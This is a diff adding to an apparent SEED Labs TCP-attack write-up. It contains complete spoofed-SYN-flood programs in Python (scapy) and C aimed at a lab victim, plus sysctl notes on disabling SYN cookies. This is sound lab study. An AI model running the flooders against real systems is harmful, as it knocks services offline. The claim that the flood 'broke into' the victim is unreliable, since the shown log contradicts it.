@@ -12,7 +12,7 @@ For general overview and the setup package for this lab, please go to [SEED Labs
 
 Any operating system that supports networking has some type of network stack.
 
-![linux-network-stack](/assets/images/lns.png){:class="img-responsive"}
+![linux-network-stack](/assets/images/lns.png){:class="img-responsive" width="85%"}
 <p style="text-align:center;color:gray;font-size:80%;">
 Source: <span><a href="https://www.usenix.org/conference/srecon22apac/presentation/jiang">Jizhong Jiang and Shane Xie, Alibaba Cloud</a></span>
 </p>
@@ -28,6 +28,326 @@ Source: <span><a href="http://arthurchiao.art/blog/tcp-listen-a-tale-of-two-queu
 {:toc}
 
 ## Task 1: SYN Flooding Attack
+
+Based on the amount of memory available, the maximum number of remembered connection requests that did not receive an acknowledgment from connecting client is set by the operating system kernel:
+
+```console
+$ cat /proc/sys/net/ipv4/tcp_max_syn_backlog
+128
+```
+
+This value can also be retrieved with the following command:
+
+```console
+$ sysctl net.ipv4.tcp_max_syn_backlog
+net.ipv4.tcp_max_syn_backlog = 128
+```
+
+By default, Ubuntu's SYN flooding countermeasure is turned on:
+
+```console
+$ sysctl -a | grep syncookies
+...
+net.ipv4.tcp_syncookies = 1
+...
+```
+
+This mechanism is called "SYN cookie". It will kick in if the machine detects that it is under the SYN flooding attack. The following lines inside our `docker-compose.yml` file:
+
+```yaml
+sysctls:
+    - net.ipv4.tcp_syncookies=0
+```
+
+turns off this countermeasure for the victim server container. Also pay attention to this line:
+
+```yaml
+privileged: true
+```
+
+The victim server container is thus given the privilege to use `sysctl` to change the values of system variables.
+
+### Task 1.1: Launch the Attack Using Python
+
+```python
+#!/bin/env python3
+
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbits
+
+ip = IP(dst="10.9.0.5")                                 # victim's IPv4 address
+tcp = TCP(dport=23, flags='S')
+pkt = ip/tcp
+
+while True:
+    pkt[IP].src     = str(IPv4Address(getrandbits(32))) # source IP
+    pkt[TCP].sport  = getrandbits(16)                   # source port
+    pkt[TCP].seq    = getrandbits(32)                   # sequence number
+    send(pkt, verbose = 0)
+```
+
+The above Python program sends out spoofed TCP SYN packets, with randomly generated source IP address, source port, and sequence number. Run this program for at least one minute and then try to `telnet` into the victim machine:
+
+```console
+$ docker-compose ps
+     Name                    Command               State   Ports
+----------------------------------------------------------------
+seed-attacker     /bin/sh -c /bin/bash             Up           
+user1-10.9.0.6    bash -c  /etc/init.d/openb ...   Up           
+user2-10.9.0.7    bash -c  /etc/init.d/openb ...   Up           
+victim-10.9.0.5   bash -c  /etc/init.d/openb ...   Up
+$ docker exec -it seed-attacker /bin/bash
+root@ip-172-31-1-54:/# cd volumes
+root@ip-172-31-1-54:/volumes# touch synflood.py
+root@ip-172-31-1-54:/volumes# nano synflood.py
+root@ip-172-31-1-54:/volumes# python3 synflood.py &
+[1] 22
+root@ip-172-31-1-54:/volumes# telnet 10.9.0.5
+# telnet 10.9.0.5
+Trying 10.9.0.5...
+Connected to 10.9.0.5.
+Escape character is '^]'.
+Ubuntu 20.04.1 LTS
+d19b63619cad login:
+Login timed out after 60 seconds.
+Connection closed by foreign host.
+```
+
+After a while, our attack successfully broke into the victim's machine.
+
+### Task 1.2: Launch the Attack Using C
+
+Other than the TCP cache issue, all the issues mentioned in the lab instructions for Task 1.1 can be resolved if we can send spoofed SYN packets fast enough.
+
+```c
+/* synflood.c */
+/* Compile with: gcc -o synflood synflood.c */
+/* Run with: ./synflood 10.9.0.5 23 */
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <time.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+
+/* IP Header */
+struct ipheader
+{
+    unsigned char      iph_ihl : 4,     // IP header length
+                       iph_ver : 4;     // IP version
+    unsigned char      iph_tos;         // Type of service
+    unsigned short int iph_len;         // IP Packet length (data + header)
+    unsigned short int iph_ident;       // Identification
+    unsigned short int iph_flag : 3,    // Fragmentation flags
+                       iph_offset : 13; // Flags offset
+    unsigned char      iph_ttl;         // Time to Live
+    unsigned char      iph_protocol;    // Protocol type
+    unsigned short int iph_chksum;      // IP datagram checksum
+    struct in_addr     iph_sourceip;    // Source IP address
+    struct in_addr     iph_destip;      // Destination IP address
+};
+
+/* TCP Header */
+struct tcpheader
+{
+    u_short tcp_sport;  /* source port */
+    u_short tcp_dport;  /* destination port */
+    u_int   tcp_seq;    /* sequence number */
+    u_int   tcp_ack;    /* acknowledgement number */
+    u_char  tcp_offx2;  /* data offset, rsvd */
+#define TH_OFF(th) (((th)->tcp_offx2 & 0xf0) >> 4)
+    u_char tcp_flags;
+#define TH_FIN  0x01
+#define TH_SYN  0x02
+#define TH_RST  0x04
+#define TH_PUSH 0x08
+#define TH_ACK  0x10
+#define TH_URG  0x20
+#define TH_ECE  0x40
+#define TH_CWR  0x80
+#define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_URG | TH_ECE | TH_CWR)
+    u_short tcp_win; /* window */
+    u_short tcp_sum; /* checksum */
+    u_short tcp_urp; /* urgent pointer */
+};
+
+/* Psuedo TCP header */
+struct pseudo_tcp
+{
+    unsigned            saddr, daddr;
+    unsigned char       mbz;
+    unsigned char       ptcl;
+    unsigned short      tcpl;
+    struct tcpheader    tcp;
+    char                payload[1500];
+};
+
+// #define DEST_IP    "10.9.0.5"
+// #define DEST_PORT  23  // Attack the web server
+#define PACKET_LEN 1500
+
+unsigned short calculate_tcp_checksum(struct ipheader *ip);
+
+/*************************************************************
+  Given an IP packet, send it out using a raw socket.
+**************************************************************/
+void send_raw_ip_packet(struct ipheader *ip)
+{
+    struct sockaddr_in dest_info;
+    int enable = 1;
+
+    // Step 1: Create a raw network socket.
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sock < 0)
+    {
+        fprintf(stderr, "socket() failed: %s\n", strerror(errno));
+        exit(1);
+    }
+
+    // Step 2: Set socket option.
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
+               &enable, sizeof(enable));
+
+    // Step 3: Provide needed information about destination.
+    dest_info.sin_family = AF_INET;
+    dest_info.sin_addr = ip->iph_destip;
+
+    // Step 4: Send the packet out.
+    sendto(sock, ip, ntohs(ip->iph_len), 0,
+           (struct sockaddr *)&dest_info, sizeof(dest_info));
+    close(sock);
+}
+
+/******************************************************************
+  Spoof a TCP SYN packet.
+*******************************************************************/
+int main(int argc, char *argv[])
+{
+    char buffer[PACKET_LEN];
+    struct ipheader *ip = (struct ipheader *)buffer;
+    struct tcpheader *tcp = (struct tcpheader *)(buffer +
+                                                 sizeof(struct ipheader));
+
+    if (argc < 3)
+    {
+        printf("Please provide IP and Port number\n");
+        printf("Usage: synflood ip port\n");
+        exit(1);
+    }
+
+    char *DEST_IP = argv[1];
+    int DEST_PORT = atoi(argv[2]);
+
+    srand(time(0)); // Initialize the seed for random # generation.
+    while (1)
+    {
+        memset(buffer, 0, PACKET_LEN);
+        /*********************************************************
+           Step 1: Fill in the TCP header.
+        ********************************************************/
+        tcp->tcp_sport  = rand();           // Use random source port
+        tcp->tcp_dport  = htons(DEST_PORT);
+        tcp->tcp_seq    = rand();           // Use random sequence #
+        tcp->tcp_offx2  = 0x50;
+        tcp->tcp_flags  = TH_SYN;           // Enable the SYN bit
+        tcp->tcp_win    = htons(20000);
+        tcp->tcp_sum    = 0;
+
+        /*********************************************************
+           Step 2: Fill in the IP header.
+        ********************************************************/
+        ip->iph_ver = 4;                    // Version (IPV4)
+        ip->iph_ihl = 5;                    // Header length
+        ip->iph_ttl = 50;                   // Time to live
+        ip->iph_sourceip.s_addr = rand();   // Use a random IP address
+        ip->iph_destip.s_addr = inet_addr(DEST_IP);
+        ip->iph_protocol = IPPROTO_TCP;     // The value is 6.
+        ip->iph_len = htons(sizeof(struct ipheader) +
+                            sizeof(struct tcpheader));
+
+        // Calculate tcp checksum
+        tcp->tcp_sum = calculate_tcp_checksum(ip);
+
+        /*********************************************************
+          Step 3: Finally, send the spoofed packet
+        ********************************************************/
+        send_raw_ip_packet(ip);
+    }
+
+    return 0;
+}
+
+unsigned short in_cksum(unsigned short *buf, int length)
+{
+    unsigned short *w = buf;
+    int nleft = length;
+    int sum = 0;
+    unsigned short temp = 0;
+
+    /*
+     * The algorithm uses a 32 bit accumulator (sum), adds
+     * sequential 16 bit words to it, and at the end, folds back all
+     * the carry bits from the top 16 bits into the lower 16 bits.
+     */
+    while (nleft > 1)
+    {
+        sum += *w++;
+        nleft -= 2;
+    }
+
+    /* treat the odd byte at the end, if any */
+    if (nleft == 1)
+    {
+        *(u_char *)(&temp) = *(u_char *)w;
+        sum += temp;
+    }
+
+    /* add back carry outs from top 16 bits to low 16 bits */
+    sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
+    sum += (sum >> 16);                 // add carry
+    return (unsigned short)(~sum);
+}
+
+/****************************************************************
+  TCP checksum is calculated on the pseudo header, which includes
+  the TCP header and data, plus some part of the IP header.
+  Therefore, we need to construct the pseudo header first.
+*****************************************************************/
+
+unsigned short calculate_tcp_checksum(struct ipheader *ip)
+{
+    struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip +
+                             sizeof(struct ipheader));
+
+    int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);
+
+    /* pseudo tcp header for the checksum computation */
+    struct pseudo_tcp p_tcp;
+    memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));
+
+    p_tcp.saddr = ip->iph_sourceip.s_addr;
+    p_tcp.daddr = ip->iph_destip.s_addr;
+    p_tcp.mbz   = 0;
+    p_tcp.ptcl  = IPPROTO_TCP;
+    p_tcp.tcpl  = htons(tcp_len);
+    memcpy(&p_tcp.tcp, tcp, tcp_len);
+
+    return (unsigned short)in_cksum((unsigned short *)&p_tcp,
+                                    tcp_len + 12);
+}
+```
+
+After a relatively short period of time, our attack succeeded.
+
+## Task 2: TCP RST Attacks on `telnet` Connections
+
+## Task 3: TCP Session Hijacking
+
+## Task 4: Creating Reverse Shell using TCP Session Hijacking
 
 ## Notes
 
